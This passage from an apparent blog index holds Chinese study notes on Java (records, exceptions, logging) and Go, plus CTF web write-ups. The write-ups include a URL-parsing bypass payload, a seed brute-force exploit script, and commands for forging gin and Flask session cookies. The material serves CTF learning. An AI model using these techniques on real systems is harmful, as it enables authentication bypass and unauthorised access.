} } public class Main { public static void main(String[] args) { Point p = new Point(123, 456); System.out.println(p.x()); System.out.println(p.y()); System.out.println(p); } } public record Point(int x, int y) {} 最后一行相当于\npublic final class Point extends Record { private final int x; private final int y; public Point(int x, int y) { this.x = x; this.y = y; } public int x() { return this.x; } public int y() { return this.y; } public String toString() { return String.format(\u0026#34;Point[x=%s, y=%s]\u0026#34;, x, y); } public boolean equals(Object o) { ... } public int hashCode() { ... } } 除了用final修饰class以及每个字段外，编译器还自动为我们创建了构造方法，和字段名同名的方法，以及覆写toString()、equals()和hashCode()方法\n和enum类似，我们自己不能直接从Record派生，只能通过record关键字由编译器实现继承 如果要对参数进行检查，可以用Compact Constructor public record Point(int x, int y) { public Point { if (x \u0026lt; 0 || y \u0026lt; 0) { throw new IllegalArgumentException(); } } } 编译器生成的方法\npublic final class Point extends Record { public Point(int x, int y) { // 这是我们编写的Compact Constructor: if (x \u0026lt; 0 || y \u0026lt; 0) { throw new IllegalArgumentException(); } // 这是编译器继续生成的赋值代码: this.x = x; this.y = y; } ... } 作为record的Point仍然可以通过of()添加静态方法 public record Point(int x, int y) { public static Point of() { return new Point(0, 0); } public static Point of(int x, int y) { return new Point(x, y); } } var z = Point.of(); var p = Point.of(123, 456); 异常处理 异常\u0026amp;捕获异常 Java内置异常处理机制，是一种class，本身带有类型信息；异常可以在任何地方抛出，但只需要在上层捕获，这样可以做到和方法调用分离 try { String s = processFile(“C:\\\\test.txt”); // ok: } catch (FileNotFoundException e) { // file not found: } catch (SecurityException e) { // no read permission: } catch (IOException e) { // io error: } catch (Exception e) { // other error: } 继承关系是这样的 Throwable是异常体系的根，它继承自Object\nError表示严重错误，比如OutofMemoryError, NoClassDefFoundError, StackOverflowError\nException表示运行时的异常，可以被捕获并处理，比如NumberFormatException, FileNotFoundException, SocketException；还包括一些可修正的语法错误，比如NullPointerException, IndexOutOfBoundsException\n常用异常 Exception │ ├─ RuntimeException │ │ │ ├─ NullPointerException │ │ │ ├─ IndexOutOfBoundsException │ │ │ ├─ SecurityException │ │ │ └─ IllegalArgumentException │ │ │ └─ NumberFormatException │ ├─ IOException │ │ │ ├─ UnsupportedCharsetException │ │ │ ├─ FileNotFoundException │ │ │ └─ SocketException │ ├─ ParseException │ ├─ GeneralSecurityException │ ├─ SQLException │ └─ TimeoutException 必须捕获的异常，包括Exception及其子类，但不包括RuntimeException及其子类，这种类型的异常称为Checked Exception\n如果不捕获Checked Exception，编译器会报错，原因是方法定义时使用throws Xxx表示该方法可能抛出的异常类型，导致调用方在调用的时候，必须强制捕获这些异常\n不需要捕获的异常，包括Error及其子类，RuntimeException及其子类\n捕获异常需要提前import\nimport java.io.UnsupportedEncodingException; import java.util.Arrays; public class Main { public static void main(String[] args) { try { byte[] bs = toGBK(\u0026#34;中文\u0026#34;); System.out.println(Arrays.toString(bs)); } catch (UnsupportedEncodingException e) { System.out.println(e); } } static byte[] toGBK(String s) throws UnsupportedEncodingException { // 用指定编码转换String为byte[]: return s.getBytes(\u0026#34;GBK\u0026#34;); } } 只要是方法声明的Checked Exception，不在调用层捕获，也必须在更高的调用层捕获；所有未捕获的异常，最终也必须在main()方法中捕获 所有异常都可以调用printStackTrace()方法打印异常栈 static byte[] toGBK(String s) { try { return s.getBytes(\u0026#34;GBK\u0026#34;); } catch (UnsupportedEncodingException e) { // 先记下来再说: e.printStackTrace(); } return null; 如果不想用try可以直接把main()方法定义为throws Exception import java.io.UnsupportedEncodingException; import java.util.Arrays; public class Main { public static void main(String[] args) throws Exception { byte[] bs = toGBK(\u0026#34;中文\u0026#34;); System.out.println(Arrays.toString(bs)); } static byte[] toGBK(String s) throws UnsupportedEncodingException { // 用指定编码转换String为byte[]: return s.getBytes(\u0026#34;GBK\u0026#34;); } } 相当于声明了所有可能抛出的Exception，也就不用捕获了；代价就是一旦发生异常，程序会立刻退出，不够灵活\n当方法声明了可能抛出的异常，可以没有catch，只使用try ... finally结构 void process(String file) throws IOException { try { ... } finally { System.out.println(\u0026#34;END\u0026#34;); } } 可以一个try对多个catch，此时注意catch的顺序：子类在前，避免短路 public static void main(String[] args) { try { process1(); process2(); process3(); } catch (IOException e) { System.out.println(\u0026#34;IO error\u0026#34;); } catch (UnsupportedEncodingException e) { // 永远捕获不到 会被上面的截胡 System.out.println(\u0026#34;Bad encoding\u0026#34;); } } 抛出异常 分两步：创建某个Exception的实例 -\u0026gt; 抛出 void process2(String s) { if (s==null) { throw new NullPointerException(); } } 如果一个方法捕获了某个异常后，又在catch子句中抛出新的异常，就相当于把抛出的异常类型“转换”了；注意为了能追踪到完整的异常栈，在构造异常的时候，把原始的Exception实例传进去 public class Main { public static void main(String[] args) { try { process1();\t// 01 } catch (Exception e) { e.printStackTrace();\t// 05 } } static void process1() { try { process2();\t// 02 } catch (NullPointerException e) { // throw new IllegalArgumentException(); throw new IllegalArgumentException(e);\t// 04 } } static void process2() { throw new NullPointerException();\t// 03 } } 如果用注释掉的方式写就会丢失NullPointerException这一条\n在代码中获取原始异常可以使用Throwable.getCause()方法。如果返回null，说明已经是“根异常”了(Caused by: xxxx) 如果在finally中抛出异常（尽量别），由于catch中准备抛出的异常就“消失”了，所以这个没有被抛出的异常称为“被屏蔽”的异常Suppressed Exception 如果我们需要获知所有的异常，可以先用origin变量保存原始异常，然后调用Throwable.addSuppressed()，把原始异常添加进来，最后在finally抛出 public class Main { public static void main(String[] args) throws Exception { Exception origin = null; try { System.out.println(Integer.parseInt(\u0026#34;abc\u0026#34;)); } catch (Exception e) { origin = e; throw e; } finally { Exception e = new IllegalArgumentException(); if (origin != null) { e.addSuppressed(origin); } throw e; } } } 当catch和finally都抛出了异常时，虽然catch的异常被屏蔽了，但是，finally抛出的异常仍然包含了它：\nException in thread \u0026#34;main\u0026#34; java.lang.IllegalArgumentException at Main.main(Main.java:11) Suppressed: java.lang.NumberFormatException: For input string: \u0026#34;abc\u0026#34; at java.base/java.lang.NumberFormatException.forInputString(NumberFormatException.java:65) at java.base/java.lang.Integer.parseInt(Integer.java:652) at java.base/java.lang.Integer.parseInt(Integer.java:770) at Main.main(Main.java:6) 通过Throwable.getSuppressed()可以获取所有的Suppressed Exception\n自定义异常 见的做法是自定义一个BaseException作为“根异常”，然后，派生出各种业务类型的异常；BaseException需要从一个适合的Exception派生，通常建议从RuntimeException派生 public class BaseException extends RuntimeException { } public class UserNotFoundException extends BaseException { } public class LoginFailedException extends BaseException { } 自定义的BaseException应该提供多个构造方法 public class BaseException extends RuntimeException { public BaseException() { super(); } public BaseException(String message, Throwable cause) { super(message, cause); } public BaseException(String message) { super(message); } public BaseException(Throwable cause) { super(cause); } } 这样，抛出异常的时候，就可以选择合适的构造方法\n断言 JVM默认关闭断言指令，需传入-enableassertions或-ea；还可以有选择地对特定地类启用断言，命令行参数是：-ea:com.itranswarp.sample.Main，表示只对com.itranswarp.sample.Main这个类启用断言；或者对特定地包启用断言，命令行参数是：-ea:com.itranswarp.sample...（注意结尾有3个.），表示对com.itranswarp.sample这个包启动断言 是一种调试方式，失败时会抛出AssertionError，导致程序结束退出 public static void main(String[] args) { double x = Math.abs(-123.45); assert x \u0026gt;= 0 : \u0026#34;x must \u0026gt;= 0\u0026#34;;\t// 会带上消息 System.out.println(x); } 不能用于可恢复的程序错误，只应该用于开发和测试阶段，对于可恢复的程序错误，不应该使用断言 void sort(int[] arr) { assert arr != null; } 应该直接捕获了\nvoid sort(int[] arr) { if (arr == null) { throw new IllegalArgumentException(\u0026#34;array cannot be null\u0026#34;); } } 日志 为了取代System.out.println()，封装好了很多好用的方法\nJDK Logging 标准库自带\nimport java.util.logging.Level; import java.util.logging.Logger; public class Hello { public static void main(String[] args) { Logger logger = Logger.getGlobal(); logger.info(\u0026#34;start process...\u0026#34;); logger.warning(\u0026#34;memory is running out...\u0026#34;); logger.fine(\u0026#34;ignored.\u0026#34;); logger.severe(\u0026#34;process will be terminated...\u0026#34;); } } JDK的Logging定义了7个日志级别，从严重到普通 SEVERE, WARNING, INFO(default), CONFIG, FINE, FINER, FINEST\n局限：配置不太方便，需要在JVM启动时传递参数-Djava.util.logging.config.file=\u0026lt;config-file-name\u0026gt;，一旦开始运行main()方法，就无法修改配置 Commons Logging 第三方，由Apache创建，可以挂接不同的日志系统，并通过配置文件指定挂接的日志系统\n可作为日志接口，而非日志实现\n默认搜索Log4j，没有的话用JDK Logging 使用很简单 import org.apache.commons.logging.Log; import org.apache.commons.logging.LogFactory; public class Main { public static void main(String[] args) { Log log = LogFactory.getLog(Main.class);\t// 获取实例 log.info(\u0026#34;start...\u0026#34;);\t// 打印日志 log.warn(\u0026#34;end.\u0026#34;); } } 6个日志级别 FATAL, ERROR, WARNING, INFO(default), DEBUG, TRACE\n除info(String)外还有info(String, Throwable)这样一个重载方法，便于更简单地记录异常 try { ... } catch (Exception e) { log.error(\u0026#34;got exception!\u0026#34;, e); } 如果在静态方法中引用Log，通常直接定义一个静态类型变量： // 在静态方法中引用Log: public class Main { static final Log log = LogFactory.getLog(Main.class); static void foo() { log.info(\u0026#34;foo\u0026#34;); } } 在实例方法中引用Log，通常定义一个实例变量 // 在实例方法中引用Log: public class Person { protected final Log log = LogFactory.getLog(getClass()); void foo() { log.info(\u0026#34;foo\u0026#34;); } } 上面展示了两种getLog()的方式，第二种的好处是子类可以直接使用该实例，原因是Java的动态特性，子类获取的Log字段实际上相当于LogFactory.getLog(Student.class)，但却是从父类继承而来，并且无需改动代码 Log4j 日志实现（乐）Log4j，我真的好喜欢你啊！为了你，我不要用无序列表了！！！\nLog4j是一个组件化设计的日志系统，它的架构大致如下\n当我们使用Log4j输出一条日志时，Log4j自动通过不同的Appender把同一条日志输出到不同的目的地\nconsole：输出到屏幕； file：输出到文件； socket：通过网络输出到远程计算机； jdbc：输出到数据库 通过Filter来过滤哪些log需要被输出，最后，通过Layout来格式化日志信息\n使用Log4j时只需把一个log4j2.xml的文件放到classpath下就可以让Log4j读取配置文件并按照我们的配置来输出日志\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;Configuration\u0026gt; \u0026lt;Properties\u0026gt; \u0026lt;!-- 定义日志格式 --\u0026gt; \u0026lt;Property name=\u0026#34;log.pattern\u0026#34;\u0026gt;%d{MM-dd HH:mm:ss.SSS} [%t] %-5level %logger{36}%n%msg%n%n\u0026lt;/Property\u0026gt; \u0026lt;!-- 定义文件名变量 --\u0026gt; \u0026lt;Property name=\u0026#34;file.err.filename\u0026#34;\u0026gt;log/err.log\u0026lt;/Property\u0026gt; \u0026lt;Property name=\u0026#34;file.err.pattern\u0026#34;\u0026gt;log/err.%i.log.gz\u0026lt;/Property\u0026gt; \u0026lt;/Properties\u0026gt; \u0026lt;!-- 定义Appender，即目的地 --\u0026gt; \u0026lt;Appenders\u0026gt; \u0026lt;!-- 定义输出到屏幕 --\u0026gt; \u0026lt;Console name=\u0026#34;console\u0026#34; target=\u0026#34;SYSTEM_OUT\u0026#34;\u0026gt; \u0026lt;!-- 日志格式引用上面定义的log.pattern --\u0026gt; \u0026lt;PatternLayout pattern=\u0026#34;${log.pattern}\u0026#34; /\u0026gt; \u0026lt;/Console\u0026gt; \u0026lt;!-- 定义输出到文件,文件名引用上面定义的file.err.filename --\u0026gt; \u0026lt;RollingFile name=\u0026#34;err\u0026#34; bufferedIO=\u0026#34;true\u0026#34; fileName=\u0026#34;${file.err.filename}\u0026#34; filePattern=\u0026#34;${file.err.pattern}\u0026#34;\u0026gt; \u0026lt;PatternLayout pattern=\u0026#34;${log.pattern}\u0026#34; /\u0026gt; \u0026lt;Policies\u0026gt; \u0026lt;!-- 根据文件大小自动切割日志 --\u0026gt; \u0026lt;SizeBasedTriggeringPolicy size=\u0026#34;1 MB\u0026#34; /\u0026gt; \u0026lt;/Policies\u0026gt; \u0026lt;!-- 保留最近10份 --\u0026gt; \u0026lt;DefaultRolloverStrategy max=\u0026#34;10\u0026#34; /\u0026gt; \u0026lt;/RollingFile\u0026gt; \u0026lt;/Appenders\u0026gt; \u0026lt;Loggers\u0026gt; \u0026lt;Root level=\u0026#34;info\u0026#34;\u0026gt; \u0026lt;!-- 对info级别的日志，输出到console --\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;console\u0026#34; level=\u0026#34;info\u0026#34; /\u0026gt; \u0026lt;!-- 对error级别的日志，输出到err，即上面定义的RollingFile --\u0026gt; \u0026lt;AppenderRef ref=\u0026#34;err\u0026#34; level=\u0026#34;error\u0026#34; /\u0026gt; \u0026lt;/Root\u0026gt; \u0026lt;/Loggers\u0026gt; \u0026lt;/Configuration\u0026gt; SLF4J\u0026amp;Logback 类似上面那一对，做了些许改进\nCommons Logging SLF4J org.apache.commons.logging.Log org.slf4j.Logger org.apache.commons.logging.LogFactory org.slf4j.LoggerFactory 仍使用xml\n\u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;configuration\u0026gt; \u0026lt;appender name=\u0026#34;CONSOLE\u0026#34; class=\u0026#34;ch.qos.logback.core.ConsoleAppender\u0026#34;\u0026gt; \u0026lt;encoder\u0026gt; \u0026lt;pattern\u0026gt;%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n\u0026lt;/pattern\u0026gt; \u0026lt;/encoder\u0026gt; \u0026lt;/appender\u0026gt; \u0026lt;appender name=\u0026#34;FILE\u0026#34; class=\u0026#34;ch.qos.logback.core.rolling.RollingFileAppender\u0026#34;\u0026gt; \u0026lt;encoder\u0026gt; \u0026lt;pattern\u0026gt;%d{HH:mm:ss.SSS} [%thread] %-5level %logger{36} - %msg%n\u0026lt;/pattern\u0026gt; \u0026lt;charset\u0026gt;utf-8\u0026lt;/charset\u0026gt; \u0026lt;/encoder\u0026gt; \u0026lt;file\u0026gt;log/output.log\u0026lt;/file\u0026gt; \u0026lt;rollingPolicy class=\u0026#34;ch.qos.logback.core.rolling.FixedWindowRollingPolicy\u0026#34;\u0026gt; \u0026lt;fileNamePattern\u0026gt;log/output.log.%i\u0026lt;/fileNamePattern\u0026gt; \u0026lt;/rollingPolicy\u0026gt; \u0026lt;triggeringPolicy class=\u0026#34;ch.qos.logback.core.rolling.SizeBasedTriggeringPolicy\u0026#34;\u0026gt; \u0026lt;MaxFileSize\u0026gt;1MB\u0026lt;/MaxFileSize\u0026gt; \u0026lt;/triggeringPolicy\u0026gt; \u0026lt;/appender\u0026gt; \u0026lt;root level=\u0026#34;INFO\u0026#34;\u0026gt; \u0026lt;appender-ref ref=\u0026#34;CONSOLE\u0026#34; /\u0026gt; \u0026lt;appender-ref ref=\u0026#34;FILE\u0026#34; /\u0026gt; \u0026lt;/root\u0026gt; \u0026lt;/configuration\u0026gt; 学完基础语法的感觉是约等于同时复建了PHP+c+Python+NodeJS，虽说是速通，但是感觉触类旁通，很多东西都明白了（大概）\n6小时速通基础，今天就可以学反射和其它的高级用法了！就可以跟链子了！！！\n好耶！！！\n","date":"2022-02-27T01:28:17+08:00","permalink":"https://amiaaaz.github.io/2022/02/27/java-study-notes-01/","section":"posts","tags":["Java"],"title":"Java学习笔记Ⅰ"},{"categories":["NOTES\u0026SUMMARY","LTS"],"contents":"array\u0026amp;slice 变量覆盖 A slice is a descriptor of an array segment. It consists of a pointer to the array, the length of the segment, and its capacity (the maximum length of the segment).\nGo Slices: usage and internals（建议直接看官方文档，我这里简单写一下\ngo中定义数组的基本操作是这样的\nvar a[4]int\t// int型 4个元素 a[0] = 1\t// 下标为1的元素值为1 i := a[0]\t// i == 1 基本类似于c的写法，数组变量代表整个数组，但是它并不是一个指向第一个数组元素的指针，所以说我们在操作数组中的值时实际上是在用它值的copy\n对于slice，既可以直接声明\nletters := []string{\u0026#34;a\u0026#34;, \u0026#34;b\u0026#34;, \u0026#34;c\u0026#34;, \u0026#34;d\u0026#34;} 也可以用内置的make函数\n// func make([]T, len, cap) []T var s []byte s = make([]byte, 5, 5) // s == []byte{0, 0, 0, 0, 0} 其中，[]T表示type，len表示长度，而第三个参数cap是可以缺省的，默认等于length\ns := make([]byte, 5) 关于slice的细节是我们关注的重点；它包含了一个指向数组的指针ptr，段的长度len，还有段的最大长度cap ————其实说到这里，如果有经验的已经能知道问题所在了\n以上面的s为例（缺省cap），结构是这样的\n当我们对s进行切片操作s = s[2:4]\n切片创建了一个新的slice（len和cap均不同），ptr仍指向原数组\n所以修改新的slice的元素会修改原始slice的值\nd := []byte{\u0026#39;r\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;d\u0026#39;} e := d[2:] // e == []byte{\u0026#39;a\u0026#39;, \u0026#39;d\u0026#39;} e[1] = \u0026#39;m\u0026#39; // e == []byte{\u0026#39;a\u0026#39;, \u0026#39;m\u0026#39;} // d == []byte{\u0026#39;r\u0026#39;, \u0026#39;o\u0026#39;, \u0026#39;a\u0026#39;, \u0026#39;m\u0026#39;} 元素的个数总是不能超过cap代表的上限，为了动态分配数组大小，我们有时会选择这样的操作\nt := make([]byte, len(s), (cap(s)+1)*2) // +1 in case cap(s) == 0 for i := range s { t[i] = s[i] } s = t 创建一个新的slice 并把原来的值复制进来，有一个内置函数可以直接做\nfunc copy(dst, src []T) int copy允许传入length不同的两个slice，它会帮我们处理好可能存在的潜在问题，直接\nt := make([]byte, len(s), (cap(s)+1)*2) copy(t, s) s = t 即可\n单纯向slice中添加元素可以使用内置函数append\nfunc append(s []T, x ...T) []T 当大于cap时它会自动调整，如果要append一个slice也是可以的\na := []string{\u0026#34;John\u0026#34;, \u0026#34;Paul\u0026#34;} b := []string{\u0026#34;George\u0026#34;, \u0026#34;Ringo\u0026#34;, \u0026#34;Pete\u0026#34;} a = append(a, b...) // equivalent to \u0026#34;append(a, b[0], b[1], b[2])\u0026#34; // a == []string{\u0026#34;John\u0026#34;, \u0026#34;Paul\u0026#34;, \u0026#34;George\u0026#34;, \u0026#34;Ringo\u0026#34;, \u0026#34;Pete\u0026#34;} 这分析了半天，终于到重点了）\n上面提到了，re-slicing a slice doesn\u0026rsquo;t make a copy of the underlying array, the full array will by kept in memory until it is no longer referenced\n举个例子\npackage main import ( \u0026#34;fmt\u0026#34; ) func main() { var a []int a = append(a,1) a = append(a,1) a = append(a,1) b := append(a,2) c := append(a,3) fmt.Println(b,c) } [1 1 1 3] [1 1 1 3] 我们发现3之前的2被覆盖了\n假设当a数组在append一个元素时，ptr指向0x1(假设0x1为数组地址), len=1, cap=2；append第二个元素时ptr不变，len=2, cap=2；append第三个元素时容量不够了就会动态扩容，cap=4, len=3，所以ptr指向新的0x2\n此时ptr=0x2, len=3, cap=4，再append第四个元素也就是2的时候还不需要扩容，返回ptr=0x2, len=4, cap=4给b，但此时对于a而言len=3，相当于是添加元素然后另存为了，对原数组不影响，c也是一样的情况\n————不知道我有没有解释清楚QwQ\n[Teaser CONFidence CTF 2019]The Lottery 参考：wp | wp | wp2\n[RoarCTF 2019]Dist 是上面那个题的改编\n参考：wp1\nCVE-2019-14809 解析host javascript://%250aalert(1)+\u0026#39;aa@google.com/a\u0026#39;a http://[google.com]:80 http://google.com]:80 http://google.com]:80__Anything_you\u0026#39;d_like_sir http://[google.com]FreeTextZoneHere]:80 由于net/url库的问题，这些URI解析出来Host都是google.com\n某不知名题 package main import ( \u0026#34;fmt\u0026#34; \u0026#34;io/ioutil\u0026#34; \u0026#34;log\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;net/url\u0026#34; \u0026#34;strings\u0026#34; ) func SanCheck(input string) error { u, err := url.Parse(input) if err != nil { return err } if u.Scheme != \u0026#34;http\u0026#34; { return fmt.Errorf(\u0026#34;err: Invalid Scheme [%s]\u0026#34;, u.Scheme) } if u.Opaque != \u0026#34;\u0026#34; { return fmt.Errorf(\u0026#34;err: WHAT AER YOU DOING ?!!! (%s)\u0026#34;, u.Opaque) } if u.Hostname() != \u0026#34;127.0.0.1\u0026#34; { return fmt.Errorf(\u0026#34;err: Invalid Hostname [%s]\u0026#34;, u.Hostname()) } if u.Port() != \u0026#34;\u0026#34; \u0026amp;\u0026amp; u.Port() != \u0026#34;80\u0026#34; { return fmt.Errorf(\u0026#34;err: Invalid Port [%s]\u0026#34;, u.Port()) } if u.User == nil { return fmt.Errorf(\u0026#34;err: Authorization Required\u0026#34;) } if u.User.Username() != \u0026#34;root\u0026#34; { return fmt.Errorf(\u0026#34;err: Invalid Username [%s]\u0026#34;, u.User.Username()) } if password, set := u.User.Password(); !set || password != \u0026#34;P@ssw0rd!\u0026#34; { return fmt.Errorf(\u0026#34;err: Invalid Password [%s]\u0026#34;, password) } if u.RequestURI() != \u0026#34;/flag.php\u0026#34; { return fmt.Errorf(\u0026#34;err: Invalid RequestURI [%s]\u0026#34;, u.RequestURI()) } if u.Fragment != \u0026#34;\u0026#34; { return fmt.Errorf(\u0026#34;err: Invalid Fragment [%s]\u0026#34;, u.Fragment) } if !strings.Contains(u.String(), \u0026#34;\u0026#39;Pwned!\u0026#39;\u0026#34;) { fmt.Println(u.String()) return fmt.Errorf(\u0026#34;err: San Check failed\u0026#34; + u.String()) } return nil } payload\nhttp://root:P@ssw0rd!@[127.0.0.1][\u0026#39;Pwned!\u0026#39;]:80/flag.php rand.Seed 种子小的情况下可爆破 [RACTF 2021]Military Grade package main import ( \u0026#34;bytes\u0026#34; \u0026#34;crypto/aes\u0026#34; \u0026#34;crypto/cipher\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;log\u0026#34; \u0026#34;math/rand\u0026#34; \u0026#34;net/http\u0026#34; \u0026#34;sync\u0026#34; \u0026#34;time\u0026#34; ) const rawFlag = \u0026#34;[REDACTED]\u0026#34; var flag string var flagmu sync.Mutex func PKCS5Padding(ciphertext []byte, blockSize int, after int) []byte { padding := (blockSize - len(ciphertext)%blockSize) padtext := bytes.Repeat([]byte{byte(padding)}, padding) return append(ciphertext, padtext...) } func encrypt(plaintext string, bKey []byte, bIV []byte, blockSize int) string { bPlaintext := PKCS5Padding([]byte(plaintext), blockSize, len(plaintext)) block, err := aes.NewCipher(bKey) if err != nil { log.Println(err) return \u0026#34;\u0026#34; } ciphertext := make([]byte, len(bPlaintext)) mode := cipher.NewCBCEncrypter(block, bIV) mode.CryptBlocks(ciphertext, bPlaintext) return hex.EncodeToString(ciphertext) } func changer() { ticker := time.NewTicker(time.Millisecond * 672).C for range ticker { rand.Seed(time.Now().UnixNano() \u0026amp; ^0x7FFFFFFFFEFFF000) for i := 0; i \u0026lt; rand.Intn(32); i++ { rand.Seed(rand.Int63()) } var key []byte var iv []byte for i := 0; i \u0026lt; 32; i++ { key = append(key, byte(rand.Intn(255))) } for i := 0; i \u0026lt; aes.BlockSize; i++ { iv = append(iv, byte(rand.Intn(255))) } flagmu.Lock() flag = encrypt(rawFlag, key, iv, aes.BlockSize) flagmu.Unlock() } } func handler(w http.ResponseWriter, req *http.Request) { flagmu.Lock() fmt.Fprint(w, flag) flagmu.Unlock() } func main() { log.Println(\u0026#34;Challenge starting up\u0026#34;) http.HandleFunc(\u0026#34;/\u0026#34;, handler) go changer() log.Fatal(http.ListenAndServe(\u0026#34;:80\u0026#34;, nil)) } flag 被 AES CBC 加密，加密本身没问题，问题出在种子上\n种子生成是靠 rand.Seed(time.Now().UnixNano() \u0026amp; ^0x7FFFFFFFFEFFF000) 完成，这样得到的种子很小 可以被我们爆破出来\nexp.go\npackage main import( \u0026#34;math/rand\u0026#34; \u0026#34;crypto/aes\u0026#34; \u0026#34;crypto/cipher\u0026#34; \u0026#34;encoding/hex\u0026#34; \u0026#34;fmt\u0026#34; \u0026#34;strings\u0026#34; ) func main() { hextext := \u0026#34;35e57017892d2c615ed057d20eeee56f82c7b02d2d1b7efed6944c3cc660c914\u0026#34; // Encrypted Flag for seed:=1; seed\u0026lt;=19777868; seed++ { rand.Seed(int64(seed)) for i := 0; i \u0026lt; rand.Intn(32); i++ { rand.Seed(rand.Int63()) } var key []byte var iv []byte for i := 0; i \u0026lt; 32; i++ { key = append(key, byte(rand.Intn(255))) } for i := 0; i \u0026lt; aes.BlockSize; i++ { iv = append(iv, byte(rand.Intn(255))) } block, _ := aes.NewCipher(key) mode := cipher.NewCBCDecrypter(block, iv) ciphertext, _ := hex.DecodeString(hextext) flagBytes := make([]byte, len(ciphertext)) mode.CryptBlocks(flagBytes, ciphertext) flag := string(flagBytes) if strings.Contains(flag, \u0026#34;ractf\u0026#34;) { fmt.Printf(\u0026#34;Flag: %s\\n\u0026#34;, flag) break } } } ractf{int3rEst1ng_M4sk_paTt3rn}\nmath/rand未调用Seed默认种子为1 [WMCTF2020]GOGOGO 参考：wp\nuint32整数溢出 uint32的范围是0~4294967295\n[羊城杯2021]Checkin_Go u1, err1 := strconv.ParseUint(nowMoney,10,32) u2, err2 := strconv.ParseUint(addMoney,10,32) .... newMoney = uint32(u1) + uint32(u2) flag price是uint32，以admin身份（伪造cookie）加到溢出，变小，就可以买了\n参考：wp\ngin框架伪造cookie secure-cookie-faker 工具：secure-cookie-faker\ndecode:\n.\\secure-cookie-faker.exe dec -c \u0026#34;\u0026#34; 有type detail的就是object string\nencode:\n.\\secure-cookie-faker.exe enc -n \u0026#34;mysession\u0026#34; -k \u0026#34;secret\u0026#34; -o \u0026#34;{user: admin, id: 0[int]}\u0026#34; -o : object string，its like a K-V map, it should have type hints -n : cookie name, its required because the HMAC hash\u0026rsquo;s generation relies on it -k : secret key(s), could be multiple: -k \u0026quot;key1, key2\u0026quot;, the first is hash key, and the second is encrypt block key when element\u0026rsquo;s type is string, the type tag can be omitted\ntype tag can only be int, uint, float, bool, string, byte\nchange serializer\n.\\secure-cookie-faker.exe enc -n \u0026#34;mysession\u0026#34; -k \u0026#34;secret\u0026#34; -o \u0026#34;some-string\u0026#34; -way json .\\secure-cookie-faker.exe enc -n \u0026#34;mysession\u0026#34; -k \u0026#34;secret\u0026#34; -o \u0026#34;{id: 0[int]}\u0026#34; -way json .\\secure-cookie-faker.exe enc -n \u0026#34;mysession\u0026#34; -k \u0026#34;secret\u0026#34; -o \u0026#34;some-string\u0026#34; -way nop .\\secure-cookie-faker.exe dec -c \u0026#34;MTU2NjkxMjI4NXxleUoxYzJWeUlqb2lZV1J0YVc0aWZRbz18OibftwH33BZStXtep7TbN_mbyk8RftQe9t_wxCJXhHo=\u0026#34; -way json 脚本 package main import ( \u0026#34;github.com/gin-contrib/sessions\u0026#34; \u0026#34;github.com/gin-contrib/sessions/cookie\u0026#34; \u0026#34;github.com/gin-gonic/gin\u0026#34; \u0026#34;math/rand\u0026#34; ) func main() { r := gin.Default() storage := cookie.NewStore(randomChar(16)) r.Use(sessions.Sessions(\u0026#34;o\u0026#34;, storage)) r.GET(\u0026#34;/\u0026#34;, cookieHandler) r.Run(\u0026#34;0.0.0.0:8002\u0026#34;) } func cookieHandler(c *gin.Context) { session := sessions.Default(c) session.Set(\u0026#34;uname\u0026#34;, \u0026#34;admin\u0026#34;)\t// 修改处 session.Save() } func randomChar(l int) []byte { output := make([]byte, l) rand.Read(output) return output }\t// 伪随机 [VNCTF 2022]gocalc0 据说是y老师出题有误，导致异常简单\nemmmm\ngo\u0026lt;=1.11 net/heep存在CRLF漏洞 https://github.com/go/go/issues/30794\n[WMCTF2020]GOGOGO 参考：wp\n","date":"2022-02-26T15:58:41+08:00","permalink":"https://amiaaaz.github.io/2022/02/26/go-study-notes-01/","section":"posts","tags":["Go"],"title":"Go学习笔记Ⅰ"},{"categories":["CTF"],"contents":"其余的看wp云了\nhttps://dctf21.cyberedu.ro/#challenges\nhttps://ctftime.org/event/1560/tasks/\nhttp://www.yongsheng.site/2022/02/14/DefCamp%20CTF(D-CTF)2021-22%20web/\nweb-intro Are you an admin?\nNote: Access Denied is part of the challenge.\n34.159.7.96:32291\n首页就是403，cookie部分是flask session\n$ python3 flask_session_cookie_manager3.py decode -c \u0026#39;eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgfX-Q.-TlY9gWLpyzptE31U0IwjpQ74ZI\u0026#39; b\u0026#39;{\u0026#34;logged_in\u0026#34;:false}\u0026#39; 但是不知道secret-key是啥，用c-jwt-cracker，爆了很久没爆出来key，换flask-unsign\nflask-unsign --unsign --cookie \u0026#34;eyJsb2dnZWRfaW4iOmZhbHNlfQ.YgfX-Q.-TlY9gWLpyzptE31U0IwjpQ74ZI\u0026#34; 特别快就跑出来了。。。key是password，把false改为true即可，注意t要大写！\nflask-unsign --sign --cookie \u0026#34;{\u0026#39;logged_in\u0026#39;:True}\u0026#34; --secret \u0026#39;password\u0026#39; eyJsb2dnZWRfaW4iOnRydWV9.Yg0uRg.9__6dvOpRJAfT_xO1SeU_jNk3CQ\n这个故事告诉我们不能用c-jwt-cracker，快跑！！！\npara-code I do not think that this API needs any sort of security testing as it only executes and retrieves the output of ID and PS commands.\n34.159.129.6:32136\n\u0026lt;?php require __DIR__ . \u0026#39;/flag.php\u0026#39;; if (!isset($_GET[\u0026#39;start\u0026#39;])){ show_source(__FILE__); exit; } $blackList = array( 